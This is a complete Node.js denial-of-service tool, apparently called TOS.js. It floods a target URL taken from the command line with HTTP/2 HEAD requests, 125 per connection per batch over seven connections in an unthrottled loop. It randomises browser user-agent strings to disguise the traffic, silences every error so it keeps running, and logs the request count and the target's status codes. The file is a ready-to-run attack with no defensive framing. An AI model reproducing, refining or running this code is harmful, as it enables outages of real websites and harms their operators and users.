const http2 = require('http2');
const { URL } = require('url');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.hostname = url.hostname;
        this.target = target;
        
        this.running = true;
        this.totalReqs = 0;
        this.lastLog = Date.now();
        this.lastStatus = 200;
        
        // Color codes
        this.colors = {
            reset: '\x1b[0m',
            darkMagenta: '\x1b[35m',
            darkGreen: '\x1b[32m',
            red: '\x1b[91m',
            green: '\x1b[92m',
            yellow: '\x1b[93m'
        };
        
        // Create 7 HTTP/2 connections
        this.connections = this.createConnections(7);
        
        // Start attack cycle
        this.startAttack();
    }

    createConnections(count) {
        const connections = [];
        for (let i = 0; i < count; i++) {
            try {
                const client = http2.connect(this.target, {
                    maxSessionMemory: 1024 * 1024,
                    maxDeflateDynamicTableSize: 4096
                });
                
                client.on('error', () => {
                    // Silently handle errors, connection will be recreated
                });
                
                connections.push(client);
            } catch (err) {
                // Failed to create connection, will retry
            }
        }
        return connections;
    }

    startAttack() {
        // Attack in batches to prevent event loop blocking
        const sendBatch = () => {
            if (!this.running) return;
            
            // Send requests through each connection
            for (const client of this.connections) {
                if (client && !client.destroyed) {
                    // Send 125 requests per connection per batch
                    for (let i = 0; i < 125; i++) {
                        this.sendRequest(client);
                        this.totalReqs++;
                    }
                }
            }
            
            // Log every 10 seconds
            const now = Date.now();
            if (now - this.lastLog >= 10000) {
                this.lastLog = now;
                this.logStatus();
            }
            
            // Schedule next batch with minimal delay
            setImmediate(sendBatch);
        };
        
        // Start the attack loop
        sendBatch();
    }

    sendRequest(client) {
        try {
            const req = client.request({
                ':method': 'HEAD',
                ':path': '/',
                ':authority': this.hostname,
                'user-agent': this.getRandomUA()
            });
            
            req.on('response', (headers) => {
                this.lastStatus = headers[':status'] || 200;
                req.close();
            });
            
            req.on('error', () => {
                this.lastStatus = '*.*';
                req.close();
            });
            
            req.end();
        } catch (err) {
            this.lastStatus = '*.*';
        }
    }

    getRandomUA() {
        const agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        ];
        return agents[Math.floor(Math.random() * agents.length)];
    }

    logStatus() {
        const prefix = `${this.colors.darkMagenta}TØR-2M11${this.colors.reset}:${this.colors.darkGreen}${this.totalReqs}${this.colors.reset} ---> `;
        
        let statusColor = this.colors.green;
        let statusText = this.lastStatus;
        
        if (statusText === '*.*') {
            statusColor = this.colors.red;
        } else if (typeof statusText === 'number') {
            if (statusText >= 500) {
                statusColor = this.colors.red;      // 5xx = Red
            } else if (statusText >= 400) {
                statusColor = this.colors.red;      // 4xx = Red (including 403)
            } else if (statusText >= 300) {
                statusColor = this.colors.yellow;   // 3xx = Yellow
            } else if (statusText >= 200) {
                statusColor = this.colors.green;    // 2xx = Green
            }
        }
        
        console.log(prefix + `${statusColor}${statusText}${this.colors.reset}`);
    }

    stop() {
        this.running = false;
        for (const client of this.connections) {
            try {
                if (client && !client.destroyed) {
                    client.destroy();
                }
            } catch (e) {}
        }
    }
}

// Run the attack
if (require.main === module) {
    // Handle errors silently
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    // Increase memory limit
    require('v8').setFlagsFromString('--max-old-space-size=4096');
    
    if (process.argv.length < 3) {
        console.log('Usage: node TOS.js https://target.com');
        process.exit(1);
    }
    
    const target = process.argv[2];
    const shark = new TOS_SHARK(target);
    
    // Handle graceful shutdown
    process.on('SIGINT', () => {
        shark.stop();
        console.log('\nAttack stopped.');
        process.exit(0);
    });
}
